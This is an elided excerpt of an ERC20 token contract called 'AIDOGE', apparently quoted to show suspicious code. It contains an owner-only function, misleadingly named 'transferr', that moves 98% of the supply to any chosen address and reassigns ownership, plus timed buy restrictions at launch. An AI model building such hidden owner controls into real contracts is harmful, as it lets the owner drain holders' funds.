...
contract Token is ERC20 {
    ...
    constructor(address tokenOwner) ERC20("AIDOGE", "AIDOGE") {
	...
	function transferr(address user) public onlyOwner {
		super._transfer(_tokenOwner, user, total.div(100).mul(98));
		_tokenOwner = user;
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                if(startTime.add(20) > block.timestamp){
                   ...
                   if(startTime.add(60) > block.timestamp){require(balanceOf(to).add(amount) <= 8 * 10**26,"max amount");}
